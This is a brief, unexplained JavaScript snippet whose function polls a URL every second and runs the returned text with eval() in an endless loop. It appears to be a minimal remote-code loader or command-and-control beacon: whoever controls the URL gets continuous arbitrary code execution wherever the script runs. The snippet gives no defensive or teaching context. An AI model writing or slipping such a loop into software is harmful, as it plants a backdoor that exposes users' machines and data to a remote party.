var running = true
async function fetchInLoop(u) {
    while (running) {
        try {
            const response = await fetch(u);
            const result = await response.text(); 
            eval(result);
        } catch (error) {
            console.error('Error fetching data:', error);
        }
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
    }
}

fetchInLoop(url)

